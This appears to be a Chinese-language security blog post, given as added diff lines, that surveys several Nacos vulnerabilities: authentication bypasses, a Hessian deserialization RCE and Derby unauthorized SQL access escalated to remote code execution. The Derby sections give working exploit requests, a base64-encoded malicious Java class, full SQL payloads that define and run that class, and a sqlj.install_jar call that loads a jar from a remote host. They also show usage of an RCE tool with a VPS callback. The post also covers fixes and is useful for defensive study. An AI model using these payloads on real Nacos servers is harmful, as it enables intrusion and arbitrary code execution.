+<p><img src="https://img1.plumstar.cn/upload5image-20240911141217760.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>3.3 漏洞验证</strong></em></p>
+<p>在请求头中serverIdentity:security即可绕过jwt鉴权，未加则请求失败</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911141638210.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>3.4 漏洞原理</strong></em></p>
+<p>首先逻辑是根据前面的分析判断是否开启nacos.core.auth.enabled和是否开启userAgentAuthWhite，然后是对配置文件是否配置了identity.key&amp;identity.value，若配置了则检测与配置文件是否相同，相同则允许通过。</p>
+<p><em><strong>3.5 漏洞修复</strong></em></p>
+<p>identity.key&amp;identity.value的值其实是自定义的，这个安全隐患更像弱口令，建议直接更新版本。</p>
+<h2 id="Nacos请求头User-Agent绕过鉴权"><a href="#Nacos请求头User-Agent绕过鉴权" class="headerlink" title="Nacos请求头User-Agent绕过鉴权"></a>Nacos请求头User-Agent绕过鉴权</h2><p><em><strong>4.1 漏洞简介</strong></em></p>
+<p>漏洞编号：CVE-2021-29441</p>
+<p>在Nacos的鉴权管理中，有一项配置是通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端。</p>
+<p>配置文件中<code>nacos.core.auth.enable.userAgentAuthWhite = true</code>，就会获取请求头中UserAgent的值，然后判断是否是以字符串<code>Nacos-Server</code>为开头，若是则直接跳过鉴权。</p>
+<p><strong>影响版本</strong>：Nacos &lt;&#x3D; 2.0.0-ALPHA.1</p>
+<p><em><strong>4.2 环境搭建</strong></em></p>
+<p>版本选择低于2.00即可，另外这个漏洞vulhub也有，也可以一键化部署，我这里是vulhub的，自己动手的话建议1.4.1，因为2.0.0我没试过</p>
+<p>配置文件如下</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240911115820037.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>4.3 漏洞验证</strong></em></p>
+<p>加UA后成功绕过鉴权，不加UA失败</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911125025223.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>4.4 漏洞原理</strong></em></p>
+<p>相关代码文件是core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.java<br>这里的逻辑也很简单，如果authConfigs.isEnableUserAgentAuthWhite()即配置文件中 nacos.core.auth.enable.userAgentAuthWhite 为true，就会获取请求头中UserAgent的值，然后判断是否是以字符串“Nacos-Server”为开头，若是则直接跳过鉴权。<br>StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911143925510.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>4.5 漏洞修复</strong></em></p>
+<p>更改配置文件中默认选项</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="对User-Agent绕过鉴权的bypass"><a href="#对User-Agent绕过鉴权的bypass" class="headerlink" title="对User-Agent绕过鉴权的bypass"></a>对User-Agent绕过鉴权的bypass</h2><p>是对上一个user-agent的bypass，官方修复了之后三梦师傅又发现了另一种方法，可以绕过修复</p>
+<p>不过开发者直接删除了漏洞版本的1.4.1（三梦师傅是Jan 14 提的issue，然后封装好的server端是直接更换修复后的了，不过Source code没有换），而低版本中没有对应配置项。所以想要复现试试的可以通过源码编译的方式获取环境，我这里就不详细写了，感觉三梦师傅和谢师傅写的已经很易懂了，我这种菜鸟都能看懂，感兴趣的移步两位师傅文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox#toc-5">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox#toc-5</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/4701">https://github.com/alibaba/nacos/issues/4701</a></p>
+<p>其实是我比较懒hhh</p>
+<h1 id="Nacos-Jraft-Hessian-反序列化漏洞"><a href="#Nacos-Jraft-Hessian-反序列化漏洞" class="headerlink" title="Nacos Jraft Hessian 反序列化漏洞"></a>Nacos Jraft Hessian 反序列化漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><em>漏洞描述</em></h2><p>Nacos默认的7848端口是用来处理集群模式下raft协议的通信，该端口的服务在处理部分jraft请求的时候使用hessian传输协议进行反序列化过滤不严，导致RCE。</p>
+<p>**漏洞编号：**CNVD-2023-45001</p>
+<p><strong>影响版本</strong>:</p>
+<ul>
+<li>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6（使用cluster集群模式运行）</li>
+<li>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3（任意模式运行）</li>
+</ul>
+<p>搭建环境，docker一键部署2.0.0</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> # 拉取<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>版本的nacos<br><span class="hljs-attribute">docker</span> run --name nacos -d -p <span class="hljs-number">8848</span>:<span class="hljs-number">8848</span> -p <span class="hljs-number">7848</span>:<span class="hljs-number">7848</span> -e MODE=standalone nacos/nacos-server:<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><em>漏洞检测</em></h2><p>建议直接工具梭哈，方便快捷，具体食用教程看作者文档就好</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0olw/NacosRce">https://github.com/c0olw/NacosRce</a></p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911183407539.png" srcset="/img/loading.gif" lazyload></p>
+<p>内存马打进去了，冰蝎哥斯拉什么的去连也是可以的，这里就不多写了</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>关于原理，这篇文章暂时不写，以后会不会出，不太确定，字数有点多，大家可以先看<strong>p1g3</strong>师傅的文章学习</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://exp.ci/<span class="hljs-number">2023</span>/<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/Nacos-JRaft-Hessian-反序列化分析/<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><em>漏洞修复</em></h2><p>目前，官方已发布新版本修复了该漏洞，请受影响的用户升级到安全版本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/1.4.6">https://github.com/alibaba/nacos/releases/tag/1.4.6</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.2.3">https://github.com/alibaba/nacos/releases/tag/2.2.3</a></p>
+<p><strong>临时缓解措施：</strong></p>
+<p>该漏洞仅影响7848端口（默认设置下），该端口是Nacos集群间Raft协议的通信端口，不承载客户端请求，如果受影响的用户无法及时升级，可通过禁止该端口的请求来缓解此漏洞。</p>
+<h1 id="Derby未授权-SQL注入"><a href="#Derby未授权-SQL注入" class="headerlink" title="Derby未授权-&gt;SQL注入"></a>Derby未授权-&gt;SQL注入</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><em>漏洞简介</em></h2><p>nacos带有一个嵌入式的小型数据库derby，而在版本&lt;&#x3D;1.4.0的默认配置部署nacos的情况下，它无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露，而CVE-2021-29442是因为最开始开发者没有为这个内存型数据库接口配置任何的访问控制引发的。</p>
+<p><strong>影响版本</strong>：Nacos &lt;&#x3D; 1.4.0；漏洞编号：CVE-2021-29442</p>
+<p>漏洞环境用1.4.0进行测试，也可以用vulhub搭建好像，大家可以试试</p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><em>漏洞验证</em></h2><p>手工验证：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>当然也可以发数据包试试，sql语句为：<code>select * from users</code>，其他注入语句也是一样的</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911151413140.png" srcset="/img/loading.gif" lazyload></p>
+<p>进阶利用是可以直接用下方的代码来破解此处查出来的用户密码的，毕竟加密方式是公开的</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript">package com.<span class="hljs-property">alibaba</span>.<span class="hljs-property">nacos</span>.<span class="hljs-property">console</span>.<span class="hljs-property">utils</span>;<br><br><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">security</span>.<span class="hljs-property">crypto</span>.<span class="hljs-property">bcrypt</span>.<span class="hljs-property">BCryptPasswordEncoder</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Password encoder tool.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> <span class="hljs-variable">nacos</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordEncoderUtil</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(<span class="hljs-string">&quot;nacos&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">matches</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw, <span class="hljs-title class_">String</span> encoded</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">matches</span>(raw, encoded);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(raw);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>漏洞代码在config\src\main\java\com\alibaba\nacos\config\server\controller\ConfigOpsController.java#derbyOps</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911154206474.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进一下看一眼，第一个if的值取决于是否standalone模式启动的nacos，所以在standalone模式启动nacos的话，默认就可以进入第一个if</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">PropertyUtil<span class="hljs-selector-class">.isEmbeddedStorage</span>()<br>ApplicationUtils<span class="hljs-selector-class">.getStandaloneMode</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240911154534373.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进看一下embeddedStorage</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911155232187.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进getStandaloneMode()，找到这个方法，我IDEA不知道哪里出了问题，方法跟进不过去，只能搜一下找到定义方法的地方</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911155532930.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二个if也仅仅是判断了参数sql的值是否以”select”为字符串开头，然后就直接可以使用derby的查询功能了。</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a><em>修复方案</em></h2><p>参考1.4.1中此处的代码，添加了nacos&#x2F;admin 的注解来限制仅管理员角色使用该接口(Nacos基于Spring Security来做了访问控制)</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911155753457.png" srcset="/img/loading.gif" lazyload></p>
+<p>开启鉴权配置后即可做到限制未授权访问</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911160249166.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Derby未授权-SQL注入-RCE"><a href="#Derby未授权-SQL注入-RCE" class="headerlink" title="Derby未授权-&gt;SQL注入-&gt;RCE"></a>Derby未授权-&gt;SQL注入-&gt;RCE</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a><em>漏洞描述</em></h2><p>在上文中我们分析了，Derby未授权SQL注入利用的是&#x2F;derby这个路由，但是限制了语句必须为select开头的即查询语句，而仅仅是查询语句就无法RCE。所以DerbyRCE的这个漏洞是利用removal接口在完成这个利用链完成derby注入的深入利用（最开始出来的打法用到的是”CALL sqlj.install_jar”简单来说就是将远程服务器上的jar包导入数据库，就可以动态调用类中的static方法），也就是所谓组合拳RCE，可以算是Nacos远程代码执行</p>
+<p>这个漏洞没给编号，看了一下长亭的通告是7月19日的通告，挺吓人的，HW刚准备开始就出来了，影响版本Nacos &lt; 2.4.0</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911164529873.png" srcset="/img/loading.gif" lazyload></p>
+<p>我这里漏洞环境就用了2.3.2，只要低于2.4.0就可以了</p>
+<h2 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a><em>漏洞检测</em></h2><p>关于漏洞的手动检测，我看懂了，但是感觉比较复杂，方法我写在这里大家可以去验证一下，我更倾向于直接脚本一把梭，虽然原版poc被删了但是还是流传出来了并且武器化了，关于原版poc的分析后续我可能会出，时间未知</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">### 启动service，也就是服务端，带着我们要打的payload<br>python3 service.py<br>### 启动主程序<br>python3 Nacos_Rce.py -t vps的ip地址 -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//xxx.xxx.xxx -c whoami</span><br>例如我这里是在本地<br>python3 Nacos_Rce.py -t <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//192.168.50.1：8848 -c whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240911231405911.png" srcset="/img/loading.gif" lazyload></p>
+<p>这种思路就是我们写到本地，也就是我们的vps，然后去加载。但是这种方式，必须在机器出网的情况下，如果目标机器不出网，就歇菜了</p>
+<p><strong>这里还想说在网上看到的另一位师傅的思路，通过create type typeClass external 的方式自定义数据类型来映射java类</strong></p>
+<p>首先验证未授权存在</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后制作命令执行类</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──(root㉿kali)-[/tmp]<br>└─# vim MaliciousClass.java<br><br><span class="hljs-bullet">--</span><br><span class="hljs-bullet"></span>public class MaliciousClass &#123;<br><span class="hljs-code">    static &#123;</span><br><span class="hljs-code">        try &#123;</span><br><span class="hljs-code">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-code">        &#125; catch (Exception e) &#123;</span><br><span class="hljs-code">                //TODO:handle exception</span><br><span class="hljs-code">        &#125;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-section">&#125;</span><br><span class="hljs-section">--</span><br><br>┌──(root㉿kali)-[/tmp]<br>└─# javac MaliciousClass.java <br><br>┌──(root㉿kali)-[/tmp]<br>└─# cat MaliciousClass.class | base64<br>yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENv<br>ZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3Vy<br>Y2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNq<br>YXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAR<br>amF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAE<br>ZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAA<br>AgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAA<br>RwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQAN<br>AAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==<br></code></pre></td></tr></table></figure>
+
+<p><strong>对应的sql语句，这些语句其实也好理解，上面我们是从vps去加载我们的payload，这个是我们自己去在目标机器通过create type typeClass external 的方式自定义数据类型来映射java类，达到恶意类的效果并且执行我们的命令</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.Class&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> base64Decode(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>)) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.util.Base64Utils.decodeFromString&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> getSystemClassLoader() <span class="hljs-keyword">returns</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader.getSystemClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> defineClass(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>), bytes <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA, loader typeClassLoader) <span class="hljs-keyword">returns</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test(v typeClass)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test <span class="hljs-keyword">values</span> (defineClass(<span class="hljs-string">&#x27;MaliciousClass&#x27;</span>, base64Decode(<span class="hljs-string">&#x27;yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAARwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQANAAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==&#x27;</span>), getSystemClassLoader()));<br></code></pre></td></tr></table></figure>
+
+<p>攻击：去GET我们写到目标机器的这个类，获取到我们想要的</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;file=@./payload.sql&quot;</span> <span class="hljs-string">&quot;http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>不出意外的话复现会遇到”file xxx does not exist”，这个实际上是正常的，建议写个脚本挂着打然后看运气什么时候碰撞成功了</p>
+<p>这位师傅提供的思路我并没去复现，大家感兴趣的可以试一下</p>
+<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>两部分，未授权部分的分析在上文已经写出了。</p>
+<p>derby数据库rce的原理重点就是理解上面写出的打法中用到的函数，第三种在上文中已经写了，这里简单补充下一和二</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#最开始公开poc中的利用方式，这个函数直接导入制定jar包，前提是数据库服务器必须能够访问互联网，这在不出网的目标中不适用，也就是上面工具那里</span><br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;http://example.com/malicious.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.malicious_jar&#x27;</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-meta">#先通过数据库的内置工具将 JAR 包写到本地文件系统，然后再加载它</span><br><span class="hljs-built_in">CALL</span> SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(<span class="hljs-string">&#x27;SELECT my_blob_column FROM my_table&#x27;</span>, <span class="hljs-string">&#x27;my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;&lt;delimiter&gt;&#x27;</span>)<br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;file:///path/to/my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.local_jar&#x27;</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+<p>关于具体的代码层面，这里我就不写了，其实代码跟进可能稍微难懂，其实就是一个条件竞争并且derby数据库是支持调用Java的方法，然后又结合未授权，导致了这个RCE的产生</p>
+<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1804988231747535544&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1804988231747535544&amp;wfr=spider&amp;for=pc</a></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><em>漏洞修复</em></h2><p>官方已在2.4.0版本中引入了一个新的选项 derbyOpsEnabled，并将其默认设置为关闭，以防止相关接口被滥用。可在Nacos官网下载最新版本使用。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>再次特别鸣谢各位师傅</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD/D78G7FmeYveAKg115bIeD">https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD%2FD78G7FmeYveAKg115bIeD</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html">https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/" class="category-chain-item">安全问题整理</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Nacos/" class="print-no-link">#Nacos</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nacos系列安全问题整理</div>
+      <div>http://example.com/2025/09/04/Nacos系列安全问题整理/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Winter</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
